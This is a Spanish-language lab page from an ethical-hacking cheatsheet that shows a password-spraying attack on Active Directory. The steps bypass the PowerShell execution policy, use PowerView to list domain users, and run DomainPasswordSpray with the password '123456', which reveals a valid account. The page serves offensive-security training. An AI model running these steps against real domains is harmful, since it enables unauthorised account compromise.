
# AD Password Spraying

#### Relacionado

{% content-ref url="/pages/vPZvERO5kc7PfVyzSmsQ" %}
[Password Spraying](/ethical-hacking-cheatsheet/active-directory/active-directory/password-spraying.md)
{% endcontent-ref %}

***

## <mark style="color:purple;">Lab:</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**Password Spraying**</mark>

El ataque de Password Spraying consiste en que un atacante intenta comprometer las cuentas de usuario autenticándose con una lista predefinida de contraseñas que son de uso frecuente o que probablemente sean utilizadas por su objetivo. Este ataque puede ser realizado por un atacante externo contra cualquier sistema o aplicación SaaS con acceso a internet, o por un atacante que haya logrado infiltrarse en la red y busque ampliar su acceso.

Entre los objetivos frecuentes de los ataques de Password Spraying se incluyen los servidores VPN, las aplicaciones de correo electrónico basadas en la web y los proveedores de inicio de sesión único.

A diferencia del ataque de relleno de credenciales, donde un atacante se dirige a usuarios específicos con contraseñas previamente comprometidas, el ataque de Password Spraying consiste en probar contraseñas comunes o probables contra la mayor cantidad de usuarios posible. Por lo tanto, muchos atacantes estructuran sus ataques para evitar ser detectados, por ejemplo, probando solo una contraseña por cuenta de usuario a la vez o esperando un tiempo entre intentos.

**Referencia:** <https://www.netwrix.com/password_spraying_tutorial_defense.html>

***

### Tools

En todos los labs de esta sección de AD tenemos todas las herramientas necesarias en la ruta C:/Tools:

```powershell
PS C:\Tools> ls

    Directory: C:\Tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/22/2021  12:12 PM                ADModule
d-----        9/22/2021  12:12 PM                hashcat
d-----        9/22/2021  12:13 PM                kekeo
d-----        9/22/2021  12:13 PM                kekeo_one
d-----        9/22/2021  12:13 PM                kerberoast-Python2
d-----        9/22/2021  12:13 PM                kerberoast-Python3
d-----        9/22/2021  12:13 PM                Nishang
d-----        9/22/2021  12:13 PM                PowerShell-Suite
d-----        9/22/2021  12:13 PM                PowerShell_IPv4NetworkScanner
d-----        9/22/2021  12:13 PM                Scripts
-a----        9/22/2021  12:12 PM          83225 10k-worst-pass.txt
-a----        9/22/2021  12:12 PM         558046 ADACLScan.ps1
-a----        9/22/2021  12:12 PM         199168 Akagi64.exe
-a----        9/22/2021  12:12 PM         506793 ASREPRoast-master.zip
-a----        9/22/2021  12:12 PM          14690 doc.chm
-a----        9/22/2021  12:12 PM           1318 encoded.txt
-a----        9/22/2021  12:12 PM           4814 encodedcommand.txt
-a----        9/22/2021  12:12 PM           6325 Execute-Command-MSSQL.ps1
-a----        9/22/2021  12:12 PM           9693 Find-PSServiceAccounts.ps1
-a----        9/22/2021  12:12 PM           2126 Find-WMILocalAdminAccess.ps1
-a----        9/22/2021  12:12 PM        5961778 HeidiSQL_9.4_Portable.zip
<---SNIP--->
```

### Importar PowerView

```bash
powershell -ep bypass
. .\PowerView.ps1
```

### Enumeración de usuarios

#### Crear lista de usuarios

```powershell
PS C:\Tools> Get-DomainUser | Select-Object -ExpandProperty cn | out-File users.txt
PS C:\Tools> cat users.txt

Administrator
Guest
krbtgt
groupmanager
student
Johnny
```

### Domain Password Spray

Usaremos el script `DomainPasswordSpray.ps1` en la ruta `C:/Tools/Scripts/credentials`:

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-PasswordSpray -UserList users.txt -Password 123456 -verbose
```

<figure><img src="/files/vtI3vgTARPIFGi7szfFs" alt=""><figcaption></figcaption></figure>

Obtenemos un usuario válido para esa contraseña: Johnny
